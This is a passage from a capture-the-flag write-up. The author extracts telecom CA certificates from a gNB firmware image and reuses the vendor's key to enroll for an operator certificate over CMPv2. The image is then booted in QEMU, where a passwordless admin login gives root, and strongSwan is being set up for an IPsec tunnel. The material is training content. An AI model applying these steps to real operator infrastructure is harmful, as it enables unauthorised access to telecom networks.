HDAaBgNVBAMME1B3bmVkIFRlbGVjb20gU3ViQ0EwggIiMA0GCSqGSIb3DQEBAQUA
A4ICDwAwggIKAoICAQDGVi6ZGiNOCh57Kuj7g9XwzXGZ/dVjgSTsnE1typJxvOxi
axUGUZuGxMyI6+7E1H7/0b76M/6Sz/ZjQf3OuSdBy3P5IDbJ2j/HkpV3zj/0UlNW
QTVB8MTjYjyVH2bWhRlUtJ7KIYThibF8+LsLLZ7vsUaHvtcmkHy2a2fUjYWftepx
lHSiedwswuJphkZC+8a9dI3zLA9KbL2VyICACYLIJ0mabmWsqpRH58XHv2o1LGr9
IEW6wKX3Ik4CsUGXFw1W9mYiyJtpPwuN1RBJ8fvQ9b178hOj38dH4RyRUI2rTpad
+qDIJZpA9lnov2taq86IDX5HntgL8i6WeAAyA2JlXjtVn9+hdacYZNkgKnPrhroX
NjVF7JTCRAV+qU9jOgIdigMlqr3/3DK0zfRgylYIOFaVzI5AMH9OpP/JniOZG41b
yGOkEKzmJDRq+5HTAROlJw6pHAKDhHxu0x1h3LLKRKSA3OElyo7QiUHEz8EN0dGa
oHuoCB7wPCy8oUaGQWsM6JO3VxIfzQQsi3FwMLnrzacWNNnJYdrgFkXTbFYB8CoT
YYZjy7lTRFsWZ6kZRSQn26UbYxh6k15LYo+3+5gFcnERcvWey6nfbXzrkhpQ/TUQ
1TzfVNAFAhLxM++mb4AI/qB0mJI6xpj7eczwqIar1TwS2X703TPzAkfpOLXqCwID
AQABo4GiMIGfMBIGA1UdEwEB/wQIMAYBAf8CAQAwHwYDVR0jBBgwFoAUNWs7NQuz
mIddXp2yedGDn2y3UgcwOQYDVR0fBDIwMDAuoCygKoYoaHR0cDovL3BraS5wd25l
ZC10ZWxlY29tL2NybHMvUm9vdENBLmNybDAdBgNVHQ4EFgQUaM9rHIWpycFUxZHv
0CRuCwHUVYQwDgYDVR0PAQH/BAQDAgGGMA0GCSqGSIb3DQEBCwUAA4ICAQB97lpx
VdYbISHTJuQLVCXS4JuLqEmo3fvqV4tHjk2TnvqvjbgR3HY8OsNm6QsMUOAJUIna
+q80SnCyXAh9qmb6PH5s2otkSX4F9rkZKOnp24ZoD7HjqhkIs9PlvnV889AxfCcl
TXgN491r3h5ZbEhgLvNhr/B/g97zghEEIUcdb4lhKMr8zIdb5hHUzMLg0+4Ro7hX
wyIwJ9YzjdBboql/RS9Wg85BXBPUijHODRIITuMY2EdMpex50FFQli5G2+EViNpy
2Gd2towlcQwj+zWUuQHY5onwEnWKoSuvfHquwT0uGyLSzlwHE5eRODDU2kiEc+Fa
UPJkbsF9O3okAaoI74dLZuZH/21wq8hvupc1pcMOwVP2zwklzRC9W34MMDdxzzyx
hf8G1KELp3rpuTg894CXMYFlb4HRCMxspyiUeBGgGLzeHvd7C5NR9+fJiTgp75K0
RvMx/IbrhSyZMasP5V1KYfk0K7Oy4eXjZaabk4ics1vYS2Um0rlDDTZDuEVYKO66
ov36AK9NECsMLawn0y9UYcAU9InMv3BHcdworZTk8tKhDnQK/FGxx5+EwrJ9AKax
1eYJWJ5sBmeo5AEH3T4SJipt2Nt6oVG+RvRE/emhiW/qGv5hfp5Po9Mb6TXbzAT3
dDeRUp/XUrbhLhdZ7Yc2oAQFqyT50PQOHl6qPw==
-----END CERTIFICATE-----
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ 
```

We note that we have 2 certificates.

```shell
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ openssl crl2pkcs7 -nocrl -certfile PwnedTelecomCA.cacert.pem | openssl pkcs7 -print_certs -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            1d:4f:da:41:1a:2e:1a:01:7d:df:7e:7c:5a:53:3f:47:fe:a8:7d:3f
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=FR, O=Pwned Telecom, CN=Pwned Telecom RootCA
        Validity
            Not Before: May 13 10:11:05 2025 GMT
            Not After : May  8 10:11:04 2045 GMT
        Subject: C=FR, O=Pwned Telecom, CN=Pwned Telecom RootCA
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (4096 bit)
                Modulus:
                    00:db:22:f3:68:98:bd:90:2f:4e:a3:6a:6c:bc:e8:
                    fa:42:48:12:5b:4d:8b:bd:35:36:f2:d2:45:1b:c5:
                    e9:04:7c:c7:1a:14:b1:b2:4f:ee:5a:74:ab:97:0e:
                    3a:d9:04:2d:c5:02:52:c6:c7:eb:da:47:5d:99:ce:
                    00:22:ef:17:f0:00:05:c7:67:d3:7f:da:37:2f:da:
                    b9:fb:51:82:c3:ec:55:83:99:03:49:2a:f3:b2:7c:
                    45:e4:ed:77:5f:b7:55:d6:fb:b5:ec:7c:4f:c7:b7:
                    27:f9:8e:ba:ee:1b:16:0f:41:27:8a:de:14:dc:b0:
                    b8:4b:bd:9e:dc:bc:cd:91:b5:3d:05:7f:93:10:66:
                    a2:e6:ca:e1:7a:f3:5b:d8:74:8f:bc:ae:af:c2:1d:
                    f9:70:be:99:1d:72:49:2c:f3:e3:2d:f7:35:6b:9c:
                    73:e4:b5:f5:5d:ce:2e:83:99:0a:d1:f7:38:63:14:
                    10:d9:50:db:95:1e:6d:00:d9:56:0b:b4:0c:fd:75:
                    54:0d:21:02:24:82:b4:7f:05:fe:27:99:08:48:3b:
                    f9:cd:36:d6:56:a2:84:3d:e4:4b:66:56:23:dc:ee:
                    46:2c:7d:95:95:f1:99:9a:e8:ef:8e:a4:68:47:c5:
                    dc:15:0e:bb:c2:f5:aa:92:e1:94:f4:91:55:a0:8d:
                    1b:c7:51:31:93:c1:f8:fe:72:1c:1a:ab:07:d8:2a:
                    81:bf:02:08:3e:a4:f8:5d:3b:01:5b:92:d0:4d:32:
                    5f:31:78:ee:5c:27:bc:ed:de:4e:85:f4:59:2b:77:
                    a8:c0:cd:e0:99:0c:15:08:6f:9b:2a:db:1e:96:5f:
                    0d:c2:6d:68:73:51:5b:9f:23:ec:43:de:ab:e8:a1:
                    e9:b8:85:e3:6c:f2:a6:48:cd:79:a6:17:df:68:60:
                    66:3b:63:b7:15:95:0d:03:38:74:04:41:ca:bf:15:
                    9f:58:6f:c3:b1:11:5b:26:05:f5:69:e3:f2:3f:1a:
                    dc:d5:2c:44:47:ff:b1:a0:05:a7:b9:5e:c7:a3:cf:
                    06:02:f7:43:fa:c8:76:e4:9b:c9:dd:80:4c:d4:5a:
                    34:5f:ca:17:d1:fa:9f:17:24:0e:77:69:36:54:0a:
                    a2:72:86:ee:57:60:89:77:86:da:f1:16:37:63:ae:
                    1a:c8:17:d1:40:a0:30:da:ee:4c:8a:76:55:b3:be:
                    f9:f8:08:c7:72:da:9c:d1:7e:15:11:4b:44:b7:82:
                    7d:57:bd:2e:a2:75:62:98:91:be:c0:17:26:26:f4:
                    a9:bb:0c:8e:22:4d:4b:0c:08:34:b8:ef:0c:e4:1a:
                    05:9b:e3:9b:54:c1:23:54:36:22:3f:1b:80:8e:d2:
                    e8:4f:9d
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: critical
                CA:TRUE
            X509v3 Authority Key Identifier: 
                35:6B:3B:35:0B:B3:98:87:5D:5E:9D:B2:79:D1:83:9F:6C:B7:52:07
            X509v3 Subject Key Identifier: 
                35:6B:3B:35:0B:B3:98:87:5D:5E:9D:B2:79:D1:83:9F:6C:B7:52:07
            X509v3 Key Usage: critical
                Digital Signature, Certificate Sign, CRL Sign
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        1b:e2:8e:0a:c8:29:50:0e:12:94:8c:98:20:72:a9:0d:29:df:
        ed:b1:12:9b:07:fc:c5:06:e3:ad:7e:8a:41:41:ec:f7:b5:4e:
        16:d3:8b:57:60:15:11:40:f1:2e:6b:31:f2:2e:a3:3b:05:01:
        43:5e:60:76:8b:30:cd:35:9d:e0:95:d3:0a:33:d5:00:7b:e0:
        92:ba:ff:ae:27:15:a1:6c:95:7a:fb:99:b5:0e:3e:d1:17:dd:
        e3:14:d3:8e:bc:b5:cf:63:d8:79:91:00:df:18:c3:5f:28:cd:
        d3:a4:d2:60:d6:54:ae:dd:56:39:cf:00:2e:0e:08:f7:4e:b5:
        3b:c0:70:92:c6:dd:98:f3:dd:4b:11:0a:34:1b:79:7f:71:62:
        86:8d:2c:76:86:e1:4e:15:40:f5:74:99:7a:53:64:0d:f2:73:
        77:01:de:63:ee:9a:40:f4:65:c7:d9:d0:dd:c4:0b:9a:ac:37:
        a2:3d:37:a8:8e:e1:18:82:7d:5b:d9:01:3e:20:b8:10:b8:06:
        2a:ec:00:d6:1e:23:b0:ba:cb:55:68:3b:df:56:7e:cc:57:19:
        3b:b6:3a:3f:2e:8a:1f:d3:ba:2b:be:30:85:c0:66:cc:4e:15:
        02:ea:e5:7a:c4:12:73:f8:37:53:10:b7:09:4f:b6:eb:8d:b9:
        08:87:68:a0:45:3c:c2:18:32:0b:f9:08:22:1f:04:76:17:80:
        a0:af:55:e5:0d:d6:b4:48:cc:5e:f9:54:56:af:a9:06:2d:29:
        fc:1e:a3:e6:f5:ca:a9:22:fb:3c:f6:78:f0:dc:e7:cb:80:84:
        66:3c:0e:34:30:6b:c4:29:33:c3:78:d9:c7:a0:5f:fe:a3:66:
        07:f3:7d:cb:d5:3b:4b:05:78:ba:af:5c:51:f6:a3:be:fb:1a:
        08:93:9a:bb:1d:7d:bc:b0:90:b7:e7:71:c2:12:00:3f:1c:19:
        19:cf:cc:ba:77:19:f8:19:00:27:98:60:00:a1:07:50:17:a7:
        04:d5:0a:a5:b1:0b:fc:02:86:67:4b:fd:4f:a8:d6:14:ca:a5:
        80:88:34:05:58:c5:2c:93:3e:ae:98:8c:a6:b4:32:14:bf:df:
        3b:92:b0:48:98:67:c4:dc:d7:52:89:ff:4a:10:95:06:ec:6f:
        8b:d6:1c:b7:4a:aa:83:b1:1a:c5:28:48:a0:dd:88:43:63:67:
        f8:17:98:ff:17:55:5a:30:94:f6:4c:8c:84:65:d5:1e:06:9d:
        d3:35:11:94:e4:24:8b:a2:cd:f5:d9:43:14:ca:73:11:fd:59:
        5e:50:4d:80:6a:82:ce:32:14:96:2a:2e:2b:55:0c:48:4d:60:
        b6:c1:47:3e:53:e0:65:7e

Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            20:45:ab:38:27:92:85:a6:6c:3e:ec:ee:f0:29:95:f3:de:4e:4e:06
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=FR, O=Pwned Telecom, CN=Pwned Telecom RootCA
        Validity
            Not Before: May 13 10:14:25 2025 GMT
            Not After : May 11 10:14:24 2035 GMT
        Subject: C=FR, O=Pwned Telecom, CN=Pwned Telecom SubCA
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (4096 bit)
                Modulus:
                    00:c6:56:2e:99:1a:23:4e:0a:1e:7b:2a:e8:fb:83:
                    d5:f0:cd:71:99:fd:d5:63:81:24:ec:9c:4d:6d:ca:
                    92:71:bc:ec:62:6b:15:06:51:9b:86:c4:cc:88:eb:
                    ee:c4:d4:7e:ff:d1:be:fa:33:fe:92:cf:f6:63:41:
                    fd:ce:b9:27:41:cb:73:f9:20:36:c9:da:3f:c7:92:
                    95:77:ce:3f:f4:52:53:56:41:35:41:f0:c4:e3:62:
                    3c:95:1f:66:d6:85:19:54:b4:9e:ca:21:84:e1:89:
                    b1:7c:f8:bb:0b:2d:9e:ef:b1:46:87:be:d7:26:90:
                    7c:b6:6b:67:d4:8d:85:9f:b5:ea:71:94:74:a2:79:
                    dc:2c:c2:e2:69:86:46:42:fb:c6:bd:74:8d:f3:2c:
                    0f:4a:6c:bd:95:c8:80:80:09:82:c8:27:49:9a:6e:
                    65:ac:aa:94:47:e7:c5:c7:bf:6a:35:2c:6a:fd:20:
                    45:ba:c0:a5:f7:22:4e:02:b1:41:97:17:0d:56:f6:
                    66:22:c8:9b:69:3f:0b:8d:d5:10:49:f1:fb:d0:f5:
                    bd:7b:f2:13:a3:df:c7:47:e1:1c:91:50:8d:ab:4e:
                    96:9d:fa:a0:c8:25:9a:40:f6:59:e8:bf:6b:5a:ab:
                    ce:88:0d:7e:47:9e:d8:0b:f2:2e:96:78:00:32:03:
                    62:65:5e:3b:55:9f:df:a1:75:a7:18:64:d9:20:2a:
                    73:eb:86:ba:17:36:35:45:ec:94:c2:44:05:7e:a9:
                    4f:63:3a:02:1d:8a:03:25:aa:bd:ff:dc:32:b4:cd:
                    f4:60:ca:56:08:38:56:95:cc:8e:40:30:7f:4e:a4:
                    ff:c9:9e:23:99:1b:8d:5b:c8:63:a4:10:ac:e6:24:
                    34:6a:fb:91:d3:01:13:a5:27:0e:a9:1c:02:83:84:
                    7c:6e:d3:1d:61:dc:b2:ca:44:a4:80:dc:e1:25:ca:
                    8e:d0:89:41:c4:cf:c1:0d:d1:d1:9a:a0:7b:a8:08:
                    1e:f0:3c:2c:bc:a1:46:86:41:6b:0c:e8:93:b7:57:
                    12:1f:cd:04:2c:8b:71:70:30:b9:eb:cd:a7:16:34:
                    d9:c9:61:da:e0:16:45:d3:6c:56:01:f0:2a:13:61:
                    86:63:cb:b9:53:44:5b:16:67:a9:19:45:24:27:db:
                    a5:1b:63:18:7a:93:5e:4b:62:8f:b7:fb:98:05:72:
                    71:11:72:f5:9e:cb:a9:df:6d:7c:eb:92:1a:50:fd:
                    35:10:d5:3c:df:54:d0:05:02:12:f1:33:ef:a6:6f:
                    80:08:fe:a0:74:98:92:3a:c6:98:fb:79:cc:f0:a8:
                    86:ab:d5:3c:12:d9:7e:f4:dd:33:f3:02:47:e9:38:
                    b5:ea:0b
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: critical
                CA:TRUE, pathlen:0
            X509v3 Authority Key Identifier: 
                35:6B:3B:35:0B:B3:98:87:5D:5E:9D:B2:79:D1:83:9F:6C:B7:52:07
            X509v3 CRL Distribution Points: 
                Full Name:
                  URI:http://pki.pwned-telecom/crls/RootCA.crl
            X509v3 Subject Key Identifier: 
                68:CF:6B:1C:85:A9:C9:C1:54:C5:91:EF:D0:24:6E:0B:01:D4:55:84
            X509v3 Key Usage: critical
                Digital Signature, Certificate Sign, CRL Sign
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        7d:ee:5a:71:55:d6:1b:21:21:d3:26:e4:0b:54:25:d2:e0:9b:
        8b:a8:49:a8:dd:fb:ea:57:8b:47:8e:4d:93:9e:fa:af:8d:b8:
        11:dc:76:3c:3a:c3:66:e9:0b:0c:50:e0:09:50:89:da:fa:af:
        34:4a:70:b2:5c:08:7d:aa:66:fa:3c:7e:6c:da:8b:64:49:7e:
        05:f6:b9:19:28:e9:e9:db:86:68:0f:b1:e3:aa:19:08:b3:d3:
        e5:be:75:7c:f3:d0:31:7c:27:25:4d:78:0d:e3:dd:6b:de:1e:
        59:6c:48:60:2e:f3:61:af:f0:7f:83:de:f3:82:11:04:21:47:
        1d:6f:89:61:28:ca:fc:cc:87:5b:e6:11:d4:cc:c2:e0:d3:ee:
        11:a3:b8:57:c3:22:30:27:d6:33:8d:d0:5b:a2:a9:7f:45:2f:
        56:83:ce:41:5c:13:d4:8a:31:ce:0d:12:08:4e:e3:18:d8:47:
        4c:a5:ec:79:d0:51:50:96:2e:46:db:e1:15:88:da:72:d8:67:
        76:b6:8c:25:71:0c:23:fb:35:94:b9:01:d8:e6:89:f0:12:75:
        8a:a1:2b:af:7c:7a:ae:c1:3d:2e:1b:22:d2:ce:5c:07:13:97:
        91:38:30:d4:da:48:84:73:e1:5a:50:f2:64:6e:c1:7d:3b:7a:
        24:01:aa:08:ef:87:4b:66:e6:47:ff:6d:70:ab:c8:6f:ba:97:
        35:a5:c3:0e:c1:53:f6:cf:09:25:cd:10:bd:5b:7e:0c:30:37:
        71:cf:3c:b1:85:ff:06:d4:a1:0b:a7:7a:e9:b9:38:3c:f7:80:
        97:31:81:65:6f:81:d1:08:cc:6c:a7:28:94:78:11:a0:18:bc:
        de:1e:f7:7b:0b:93:51:f7:e7:c9:89:38:29:ef:92:b4:46:f3:
        31:fc:86:eb:85:2c:99:31:ab:0f:e5:5d:4a:61:f9:34:2b:b3:
        b2:e1:e5:e3:65:a6:9b:93:88:9c:b3:5b:d8:4b:65:26:d2:b9:
        43:0d:36:43:b8:45:58:28:ee:ba:a2:fd:fa:00:af:4d:10:2b:
        0c:2d:ac:27:d3:2f:54:61:c0:14:f4:89:cc:bf:70:47:71:dc:
        28:ad:94:e4:f2:d2:a1:0e:74:0a:fc:51:b1:c7:9f:84:c2:b2:
        7d:00:a6:b1:d5:e6:09:58:9e:6c:06:67:a8:e4:01:07:dd:3e:
        12:26:2a:6d:d8:db:7a:a1:51:be:46:f4:44:fd:e9:a1:89:6f:
        ea:1a:fe:61:7e:9e:4f:a3:d3:1b:e9:35:db:cc:04:f7:74:37:
        91:52:9f:d7:52:b6:e1:2e:17:59:ed:87:36:a0:04:05:ab:24:
        f9:d0:f4:0e:1e:5e:aa:3f
```

We have the Root CA and Sub CA certificates.
At this stage, we normally have all information to request the CMPv2 server.

CMPv2 server authenticates device generally according to CN (Common Name) or (DN) distinguished name from the certificate. In that case, we need the second option.

```shell
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ openssl cmp -cmd ir -server 10.194.124.35:8080 -path ejbca/publicweb/cmp/3GPP \
-cert etc/ssl/certs/MyGNB_Vendor_gnb.crt -key etc/ssl/private/MyGNB_Vendor_gnb.key -certout ../PwnedTelecom-gnb.pem \
-newkey ../PwnedTelecom-gnb.key \
-subject "/CN=GNB0002164987.mygnb-vendor.org/O=MyGNB Vendor/C=FR" \
-sans "DNS=GNB0002164987.mygnb-vendor.org" \
-extracerts etc/ssl/certs/MyGNB_Vendor_rootca.crt -trusted ../PwnedTelecomCA.cacert.pem \
-implicit_confirm
cmp_main:../apps/cmp.c:2751:CMP info: using section(s) 'cmp' of OpenSSL configuration file '/usr/lib/ssl/openssl.cnf'
cmp_main:../apps/cmp.c:2759:CMP info: no [cmp] section found in config file '/usr/lib/ssl/openssl.cnf'; will thus use just [default] and unnamed section if present
setup_client_ctx:../apps/cmp.c:1958:CMP info: will contact http://10.194.124.35:8080/ejbca/publicweb/cmp/3GPP
CMP info: sending IR
CMP info: received IP
save_free_certs:../apps/cmp.c:2005:CMP info: received 1 enrolled certificate(s), saving to file '../PwnedTelecom-gnb.pem'
```

```shell
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ openssl x509 -noout -text -in ../PwnedTelecom-gnb.pem
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            39:59:a7:92:d1:eb:9a:72:08:69:46:ae:ed:ee:49:f6:af:a5:09:8a
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C = FR, O = Pwned Telecom, CN = Pwned Telecom SubCA
        Validity
            Not Before: Jul 21 09:13:22 2025 GMT
            Not After : Jul 21 09:13:21 2026 GMT
        Subject: C = FR, O = MyGNB Vendor, CN = GNB0002164987.mygnb-vendor.org
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (384 bit)
                pub:
                    04:55:6c:c4:5d:9d:db:43:b6:49:59:8d:b9:09:52:
                    1d:9b:a4:83:8a:7f:6d:4a:fe:47:3e:f7:7e:d5:9d:
                    45:89:0a:d1:4a:ad:16:6e:87:98:5d:23:98:58:64:
                    92:55:26:7e:6b:f9:9d:29:7f:10:ec:26:dc:d9:f6:
                    96:cf:2f:32:70:fb:0e:46:3d:f6:cb:be:94:f3:e2:
                    25:51:57:09:18:fb:10:44:5d:2d:d9:1c:70:22:79:
                    f6:f1:55:a5:4e:d2:a4
                ASN1 OID: secp384r1
                NIST CURVE: P-384
        X509v3 extensions:
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Authority Key Identifier: 
                68:CF:6B:1C:85:A9:C9:C1:54:C5:91:EF:D0:24:6E:0B:01:D4:55:84
            X509v3 Subject Alternative Name: 
                DNS:hit{well-done-you-have-a-certificate-for-IPSEC}, DNS:GNB0002164987.mygnb-vendor.org
            X509v3 Extended Key Usage: 
                TLS Web Client Authentication, TLS Web Server Authentication
            X509v3 CRL Distribution Points: 
                Full Name:
                  URI:http://pki.pwned-telecom/crls/SubCA.crl
            X509v3 Subject Key Identifier: 
                F6:34:07:D9:47:3E:CD:CA:7D:36:09:2D:74:27:85:CA:2B:26:53:9D
            X509v3 Key Usage: critical
                Digital Signature, Non Repudiation, Key Encipherment
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        38:94:96:a7:55:b3:37:ef:ce:69:f0:97:4d:85:92:82:6a:ca:
        e1:48:16:51:a1:57:01:a8:dd:a9:7e:52:68:f8:87:e9:15:de:
        ea:32:b7:46:ad:b2:c8:ca:4b:c9:e2:e1:75:b7:7c:3b:c6:98:
        85:c7:79:86:4c:bb:ec:c6:1f:d7:84:c9:d4:77:52:c2:68:ae:
        7d:dd:47:8f:c8:43:da:5c:04:43:57:57:b6:23:53:22:09:d2:
        e0:4a:d3:35:3c:8b:1d:e9:f8:6c:c0:29:1f:08:59:4c:9b:d6:
        c9:24:3c:60:0a:03:7b:03:7c:5a:9c:1a:4b:e4:61:65:5a:58:
        f1:b6:3b:7f:a6:20:3a:e2:f5:65:c1:51:bb:03:83:a6:fd:d0:
        05:f1:36:1b:8a:4c:74:26:fe:f6:bd:1e:1a:12:62:33:28:8c:
        ac:6d:e0:d6:dc:76:13:57:21:d3:4b:4c:2c:54:22:f0:ab:88:
        de:fc:f3:bc:17:0c:76:1d:16:9a:50:4e:65:bd:db:2a:08:da:
        9b:99:5e:85:a9:58:b1:02:b5:df:3e:64:59:22:d9:35:30:ab:
        3c:2d:15:51:c5:76:3d:a6:d0:8d:6a:89:4b:70:1f:db:fa:71:
        0d:39:af:fd:10:1a:1b:68:e8:9f:6b:3e:8f:3b:2f:40:bf:17:
        4e:c9:5c:f9:60:ae:51:b8:65:e7:53:66:97:29:1b:71:1d:8a:
        d1:3d:67:02:e7:19:4a:dd:ab:67:86:6a:a5:23:5d:d3:20:83:
        68:1e:75:15:88:63:6a:40:da:4e:20:67:8d:1b:91:c8:a7:df:
        ad:74:c3:bf:9b:b9:e7:41:d1:05:7e:48:79:a7:cf:b1:1a:15:
        84:d2:1b:b9:ea:f3:b2:a4:b7:50:2a:b2:07:ec:c4:1a:16:28:
        26:8c:fe:cf:e2:26:0e:1e:97:2f:92:c9:0d:0f:a4:bb:60:3e:
        80:64:2a:2a:b6:65:21:6f:a3:70:08:88:fd:dd:9d:32:6c:ea:
        ac:c3:12:ce:aa:1d:b8:5a:4f:6f:ed:62:a4:65:68:6a:05:31:
        02:d5:31:31:d3:f4:02:94:5b:3a:3f:2e:03:1f:c6:55:71:bc:
        58:56:b5:86:ed:29:36:42:69:91:d1:18:3c:c8:70:85:07:3e:
        fb:d3:09:be:22:94:22:42:42:3e:96:59:aa:d5:d6:de:be:ca:
        12:e9:49:58:12:57:83:ce:39:7b:a4:51:89:70:5c:7f:13:74:
        3b:79:71:02:c2:e9:c2:2e:2f:70:89:be:57:f3:49:64:94:87:
        37:70:1b:c8:09:d9:01:b9:b4:56:92:ae:f8:12:a6:1e:9b:c2:
        31:e4:12:7e:15:ca:af:ee
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ 
```

SECOND FLAG: hit{well-done-you-have-a-certificate-for-IPSEC} in the SAN (Subject Alternative Name) of the delivered certificate.

At this stage, we have all credential to establish an IPSec tunnel. The IPSec server is mentioned into the Strongswan configuration file.

```shell
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ cat etc/swanctl/swanctl.conf 
# secgw.pwned-telecom.com = 10.194.124.35

connections {
    pwned_connection {
        remote_addrs = secgw.pwned-telecom.com
        vips = 0.0.0.0
        local {
            auth = pubkey
            certs = <X.509 CERTIFICATE>
            id = <DN CERTIFICATE>
        }
        remote {
            auth = pubkey
            id = "C = FR, O = Pwned Telecom, CN = secgw.pwned-telecom.com"
        }
        children {
        pwned_connection {
            remote_ts  = 10.1.0.5/32
            start_action = start
        }
        }
    }
}
```

We need an IPSec implementation. Two options are possible:

- To implement Strongswan on our own system
- To start the image in Qemu environment and to use available binaries.

Let's consider the second choice.

We start Qemu with different options:

- Enabling KVM
- A significant amount of memory and CPU (if not, the default configuration will generate error messages in further actions: not enough resources!)
- No graphic
- CPU format is pointed to host (In further step, we will note that some libraries require the support of specific CPU options)
- UEFI
- Networking (please not that we need previous configuration in order to use a bridge named br0)

```shell
osadmin@ubuntix:~/Developments/Qemu$ sudo ip link add name br0 type bridge
osadmin@ubuntix:~/Developments/Qemu$ sudo ip link set br0 up
osadmin@ubuntix:~/Developments/Qemu$ sudo ip add del 10.194.128.133/25 dev enx381428d4636a 
osadmin@ubuntix:~/Developments/Qemu$ sudo ip link set enx381428d4636a master br0
osadmin@ubuntix:~/Developments/Qemu$ sudo dhclient -i br0
osadmin@ubuntix:~/Developments/Qemu$ 
```

Note we need to umount /mnt and to detach devices in order to avoid a read-only state of the image.

```shell
osadmin@ubuntix:~/Developments/Qemu$ sudo umount /mnt
osadmin@ubuntix:~/Developments/Qemu$ sudo losetup -d /dev/loop20
osadmin@ubuntix:~/Developments/Qemu$ lsblk
```

Then we can start Qemu.

```shell
osadmin@ubuntix:~/Developments/Qemu$ qemu-system-x86_64 -cpu host -nographic -enable-kvm -m 4G -drive format=raw,file=firmware.img -bios /usr/share/ovmf/OVMF.fd -net nic,model=virtio,macaddr=52:54:00:00:00:01 -net bridge,br=br0 -smp cores=2,threads=4,sockets=1

[    0.000000] Linux version 6.1.0-35-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.137-1 (2025-05-07)
[    0.000000] Command line: BOOT_IMAGE=/vmlinuz console=ttyS0 persist squashfs.file=rootfs.squashfs squashfs.partlabel=primary root=/dev/loop0
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009ffff] usable
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x00000000007fffff] usable
[    0.000000] BIOS-e820: [mem 0x0000000000800000-0x0000000000807fff] ACPI NVS
[    0.000000] BIOS-e820: [mem 0x0000000000808000-0x000000000080afff] usable
[    0.000000] BIOS-e820: [mem 0x000000000080b000-0x000000000080bfff] ACPI NVS
[    0.000000] BIOS-e820: [mem 0x000000000080c000-0x000000000080ffff] usable
[    0.000000] BIOS-e820: [mem 0x0000000000810000-0x00000000008fffff] ACPI NVS
[    0.000000] BIOS-e820: [mem 0x0000000000900000-0x00000000beeb3fff] usable
[    0.000000] BIOS-e820: [mem 0x00000000beeb4000-0x00000000bef74fff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000bef75000-0x00000000bf8eefff] usable
[    0.000000] BIOS-e820: [mem 0x00000000bf8ef000-0x00000000bfb6efff] reserved
...
[  OK  ] Started strongswan-starter…Ev1/IKEv2 daemon using ipsec.conf.
         Starting systemd-user-sess…vice - Permit User Sessions...
[  OK  ] Finished systemd-user-sess…ervice - Permit User Sessions.
[  OK  ] Started getty@tty1.service - Getty on tty1.
[  OK  ] Started serial-getty@ttyS0…rvice - Serial Getty on ttyS0.
[  OK  ] Finished e2scrub_reap.serv…ine ext4 Metadata Check Snapshots.
[  OK  ] Started getty@tty2.service - Getty on tty2.
[  OK  ] Started getty@tty3.service - Getty on tty3.
[  OK  ] Started getty@tty4.service - Getty on tty4.
[  OK  ] Started getty@tty5.service - Getty on tty5.
[  OK  ] Started getty@tty6.service - Getty on tty6.
[  OK  ] Finished getty-static.serv…dbus and logind are not available.
[  OK  ] Reached target getty.target - Login Prompts.
[  OK  ] Reached target multi-user.target - Multi-User System.
[  OK  ] Reached target graphical.target - Graphical Interface.
         Starting systemd-update-ut… Record Runlevel Change in UTMP...
[  OK  ] Finished systemd-update-ut… - Record Runlevel Change in UTMP.
[    2.653069] Initializing XFRM netlink socket

Debian GNU/Linux 12 gNB-MyVendor ttyS0

gNB-MyVendor login: 

```

The image is a non-provisioned system, so admin account is tested, with no password :o)

```shell
Debian GNU/Linux 12 gNB-MyVendor ttyS0

gNB-MyVendor login: admin
Linux gNB-MyVendor 6.1.0-35-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.137-1 (2025-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@gNB-MyVendor:~#
```

So we configure Strongswan to establish the IPSec tunnel.

```shell
root@gNB-MyVendor:/etc# cd /etc/swanctl/
root@gNB-MyVendor:/etc/swanctl# ls -l
total 1
drwx------ 2 root root   3 Nov 13  2023 bliss
drwxr-xr-x 2 root root   3 Nov 13  2023 conf.d
drwx------ 2 root root   3 Nov 13  2023 ecdsa
drwxr-xr-x 2 root root   3 Nov 13  2023 pkcs12
drwx------ 2 root root   3 Nov 13  2023 pkcs8
drwx------ 2 root root   3 Nov 13  2023 private
drwxr-xr-x 2 root root   3 Nov 13  2023 pubkey
drwx------ 2 root root   3 Nov 13  2023 rsa
-rw-r--r-- 1 root root 548 Jul 21 06:16 swanctl.conf
drwxr-xr-x 2 root root   3 Nov 13  2023 x509
drwxr-xr-x 2 root root   3 Nov 13  2023 x509aa
drwxr-xr-x 2 root root   3 Nov 13  2023 x509ac
drwxr-xr-x 2 root root   3 Nov 13  2023 x509ca
drwxr-xr-x 2 root root   3 Nov 13  2023 x509crl
drwxr-xr-x 2 root root   3 Nov 13  2023 x509ocsp
root@gNB-MyVendor:/etc/swanctl#
```

